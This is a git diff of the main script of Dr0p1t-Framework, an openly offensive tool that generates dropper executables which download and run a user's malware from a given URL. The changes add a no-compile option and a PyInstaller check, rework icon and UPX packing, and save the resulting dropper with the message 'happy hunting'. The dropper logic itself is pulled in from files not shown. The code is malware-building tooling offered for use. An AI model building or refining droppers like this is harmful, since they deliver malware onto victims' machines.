@@ -1,3 +1,4 @@
+#!/usr/bin/python3
 #Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
 from core.banners import random_banner as banner
 from core.color import *
@@ -29,11 +30,20 @@ parser.add_argument("-v", help="Run this vbs script before running your malware.
 parser.add_argument("--only32",action='store_true', help="Download your malware for 32 bit devices only")
 parser.add_argument("--only64",action='store_true', help="Download your malware for 64 bit devices only")
 parser.add_argument("--upx",action='store_true', help="Use UPX to compress the final file.")
+parser.add_argument("--nocompile",action='store_true', help="Tell the framework to not compile the final file.")
 parser.add_argument("-i", action='store_true', help="Use icon to the final file. Check icons folder.")
 parser.add_argument("-q", action='store_true', help="Stay quite ( no banner )")
 parser.add_argument("-u", action='store_true', help="Check for updates")
 parser.add_argument("-nd", action='store_true', help="Display less output information")
 args = parser.parse_args()
+
+def PyInstaller():
+    p = subprocess.Popen("pyinstaller -h",shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+    x = p.stdout.read().decode()
+    if x == "":
+        return False
+    elif x != "":
+        return True
 
 def get_code(f):
     code = open( f,"r" ).read()
@@ -142,14 +152,10 @@ def main():
         except :
             colored_print( " [!] Error in reading vbs file,are you sure it's in scripts folder ?","r" )
 
-    if args.i:
-        try:
-            if not args.nd:
-                colored_print( " [*] Adding icon to the final file..","g" )
-            ff = open( args.i ).read()
-            command += "--icon=" + args.i
-        except:
-            colored_print( " [!] Error in icon file so I will use the default one","r" )
+    if sys.version_info[0]==3:
+    	f += '\nfrom urllib.request import urlopen\n'
+    elif sys.version_info[0]==2:
+    	f += '\nfrom urllib.request import urlopen\n'
 
     if args.only32:
         f += '\nfire_things_up("{}",arch="32")\n'.format( url )
@@ -160,30 +166,49 @@ def main():
 
     f += "\n"+get_code( os.path.join(p,"dropper.py") )
 
-    colored_print( " [*] Compiling the final file to exe..","g" )
+    colored_print( " [*] Saving the final file..","g" )
     file_name = random_name()
     os.chdir("temp")
     fo = open( file_name+".py","w" )
     fo.write(f)
     fo.close()
-    try:
-        p  = subprocess.Popen( command.format(file_name+".py"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-        (output, err) = p.communicate()
-        pw = p.wait()
-    except Exception as e:
-        print(e)
-        colored_print( " [!] Error in compiling file,are you sure pyinstaller is installed ?","r" )
-        sys.exit(0)
+
+    if not args.nocompile:
+        if PyInstaller():
+            colored_print( " [*] Compiling the final file to exe..","g" )
+            if args.i:
+                try:
+                    if not args.nd:
+                        colored_print( " [*] Adding icon to the final file..","g" )
+                    ff = open( args.i ).read()
+                    command += "--icon=" + os.path.join("icons",args.i)
+                except:
+                    colored_print( " [!] Error in icon file,are you sure it's in icons folder ?","r" )
+
+
+            try:
+                p  = subprocess.Popen( command.format(file_name+".py"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+                (output, err) = p.communicate()
+                pw = p.wait()
+            except Exception as e:
+                print(e)
+                colored_print( " [!] Error in compiling file,are you sure pyinstaller is installed ?","r" )
+                sys.exit(0)
+
+            if args.upx:
+                if not args.nd:
+                    colored_print( " [*] Compressing the final file..","g" )
+                x = subprocess.Popen(os.path.join("utils","upx.exe") +" -9 "+os.path.join("output",file_name) ,shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT )
+
+            if os.name=="nt":
+                file_name = file_name+".exe"
+            make_copy( os.path.join("temp","dist",file_name),os.path.join("output",file_name) )
+        else:
+            colored_print( " [!] PyInstaller not installed : Can't compile file to exe..","r" )
+
+    file_name = file_name+".py"
     os.chdir("..")
-    if os.name=="nt":
-        file_name = file_name+".exe"
-    make_copy( os.path.join("temp","dist",file_name),os.path.join("output",file_name) )
-
-    if args.upx:
-        if not args.nd:
-            colored_print( " [*] Compressing the final file..","g" )
-        x = subprocess.Popen(os.path.join("utils","upx.exe") +" -9 "+os.path.join("output",file_name) ,shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT )
-
+    blah = os.rename( os.path.join( "temp",file_name ),os.path.join( "output",file_name ) )
 
     colored_print( " [*] Finished and saved our Dr0pp3r as "+file_name+" in output folder ( happy hunting )","m" )
 
